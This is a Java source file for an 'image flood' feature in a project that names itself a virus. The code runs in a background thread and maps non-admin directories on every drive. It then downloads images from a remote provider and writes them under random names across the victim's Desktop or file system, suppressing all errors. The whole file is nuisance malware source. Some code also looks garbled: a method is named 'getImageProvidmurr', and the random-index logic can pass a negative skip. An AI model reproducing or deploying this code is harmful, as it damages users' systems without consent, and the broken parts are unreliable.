package me.bannock.virus.features.impl;

import me.bannock.virus.features.Feature;
import me.bannock.virus.images.ImageProviderService;
import me.bannock.virus.utils.MiscUtils;

import java.io.File;
import java.nio.file.Files;
import java.util.HashMap;
import java.util.List;

public class FeatImageFlood extends Feature {

    private HashMap<File, File> fullyMappedDirs = null;

    @Override
    public void run() {
        if (!config.shouldImageFlood())
            return;

        final ImageProviderService imageProviderService = config.getImageProvidmurr();
        final File userHomeDir = new File(System.getProperty("user.home"));
        final File userDesktopDir = new File(userHomeDir, "/Desktop");

        new Thread(() -> {
            // Get a random non admin dir on drive to write to
            if (config.shouldScatterAcrossDrive() && fullyMappedDirs == null){
                fullyMappedDirs = new HashMap<>();
                for (File drive : File.listRoots()){
                    if (!drive.canExecute())
                        continue;
                    MiscUtils.getNonAdminDirectories(drive, fullyMappedDirs);
                }
            }

            // Get images
            List<String> images = imageProviderService.fetchImages(config.getImageAmount());
            for (String url : images){
                try {
                    File imageFile = new File(userDesktopDir, Long.toString(System.nanoTime(), Character.MAX_RADIX) +
                            "." + url.split("\\.")[url.split("\\.").length - 1]);
                    if (config.shouldScatterAcrossDrive()){
                        // Select random dir to write to
                        File dir = fullyMappedDirs.values().stream().skip((int)(Math.random() * fullyMappedDirs.size()) - 1).findFirst().get();
                        imageFile = new File(dir, Long.toString(System.nanoTime(), Character.MAX_RADIX) +
                                "." + url.split("\\.")[url.split("\\.").length - 1]);
                    }
                    if (imageFile.exists())
                        continue; // We don't want to accidentally write over another file

                    // Write the image to the file
                    System.out.println(imageFile.getAbsolutePath());
                    Files.write(imageFile.toPath(), imageProviderService.fetchBytes(url));
                } catch (Exception ignored) {}

            }
        }).start();
    }
}
